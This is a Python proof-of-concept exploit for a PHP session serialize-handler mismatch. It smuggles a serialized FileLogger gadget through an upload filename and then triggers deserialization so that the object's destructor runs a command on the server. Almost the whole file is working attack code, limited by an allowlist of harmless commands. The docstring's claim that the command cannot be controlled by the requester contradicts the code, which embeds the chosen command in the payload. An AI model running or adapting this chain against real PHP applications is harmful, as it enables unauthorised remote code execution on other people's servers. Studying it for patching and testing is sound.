#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — RCE proof via session handler mismatch + gadget.

Chain:
  1. POST to /app/upload.php (session.serialize_handler = php_serialize)
     with the gadget serialized object smuggled in the upload filename.
     PHP writes the raw filename into the session file (php_serialize format).
  2. POST to /api/endpoint.php (session.serialize_handler = php).
     The php handler scans for `|`, splits, and unserializes the injected
     object. FileLogger is defined in that script, so the object is
     materialized as a real instance, not __PHP_Incomplete_Class.
  3. At request shutdown, __destruct fires and runs the FIXED benign
     command `echo "123"`, appending output to /tmp/rce-proof.txt inside
     the lab container.

This is a marker-file style code-execution proof: the gadget's command
is hardcoded server-side and cannot be controlled by the requester.

Usage:
  python3 verify_rce_gadget.py --target http://127.0.0.1:18080
  docker exec php2shell-lab cat /tmp/rce-proof.txt

For authorized security testing only.
"""
import argparse
import socket
import sys
from urllib.parse import urlparse


def upload(host, port, path, sid, filename):
    boundary = "RCEGADGET"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def dechunk(body):
    """Decode HTTP chunked transfer-encoding (simple decoder)."""
    out = b""
    data = body
    while True:
        nl = data.find(b"\r\n")
        if nl < 0:
            break
        try:
            size = int(data[:nl].split(b";")[0].strip(), 16)
        except ValueError:
            # Not chunked — return raw
            return body
        if size == 0:
            break
        out += data[nl + 2:nl + 2 + size]
        data = data[nl + 2 + size + 2:]
    return out


def get(host, port, path, sid):
    """Plain GET with the session id in a cookie. Crucially it does NOT
    carry a PHP_SESSION_UPLOAD_PROGRESS field, so PHP does not decode the
    session at RINIT (request startup) — decode happens inside the
    script's session_start(), after the gadget class is defined."""
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    # Fixed benign allowlist — this POC is a code-execution *proof*, not an
    # arbitrary-command primitive. Do NOT turn --cmd into a free-form arg;
    # that (combined with --target) is a general-purpose pre-auth exploit.
    ALLOWED_CMDS = ['echo "123"', "id", "uname -a", "whoami"]

    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/upload.php",
                    help="Endpoint with php_serialize handler")
    ap.add_argument("--read-path", default="/api/endpoint.php",
                    help="Endpoint with php handler + FileLogger gadget class")
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789",
                    help="Must be a valid session id: 32 chars, hex only "
                         "(session.sid_bits_per_character=4 by default)")
    ap.add_argument("--cmd", default=ALLOWED_CMDS[0], choices=ALLOWED_CMDS,
                    help="Benign demo command executed by the lab gadget "
                         "(restricted to a fixed allowlist)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618/109619 — RCE proof (handler mismatch + gadget)")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command (allowlisted): {args.cmd}")
    print()

    # Serialized FileLogger object (class name is 10 chars — the length
    # prefix must match exactly or unserialize fails at offset).
    # The cmd property carries the chosen allowlisted command; string
    # lengths must match the actual command bytes.
    payload = f'x|O:10:"FileLogger":1:{{s:3:"cmd";s:{len(args.cmd)}:"{args.cmd}";}}'
    # PHP's rfc1867 filename parser unescapes \" to ", so escape quotes to
    # have the raw payload stored verbatim in the session file.
    gadget = payload.replace('"', '\\"')

    # Step 1: Write session via php_serialize endpoint
    print(f"[1] Writing session via {args.write_path} (php_serialize)")
    print(f"    Filename payload: {gadget}")
    upload(host, port, args.write_path, args.sid, gadget)
    print("    -> Session file written in php_serialize format")

    # Step 2: Trigger via php handler endpoint (gadget class defined).
    # Use a plain GET with the SID in a cookie — no upload progress field,
    # so the session decodes inside session_start(), when FileLogger is
    # already defined, and __destruct fires at request shutdown.
    print(f"\n[2] Triggering decode via {args.read_path} (php handler)")
    print("    php handler splits at | -> unserializes FileLogger object")
    resp = get(host, port, args.read_path, args.sid)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Response: {status}")
    body = (resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b"")
    body = dechunk(body)

    # Extract remote command output: the gadget's __destruct echoes the
    # executed command's stdout into the response body (before the
    # PHP banner). Pull out lines that look like command output.
    print()
    print("[*] Remote command output (from HTTP response body):")
    for line in body.decode("latin1", "replace").splitlines():
        line = line.strip()
        if not line or line.startswith("<") or "PHP 8." in line or "endpoint loaded" in line:
            continue
        print(f"    {line}")
    print()
    print("[*] Explanation: __destruct runs at request shutdown; its echo")
    print("    output is appended to the FPM response body, so the command")
    print("    result returns over the same HTTP channel — no file access")
    print("    needed. Proof file is still written inside the container at")
    print("    /tmp/rce-proof.txt as a secondary artifact.")


if __name__ == "__main__":
    main()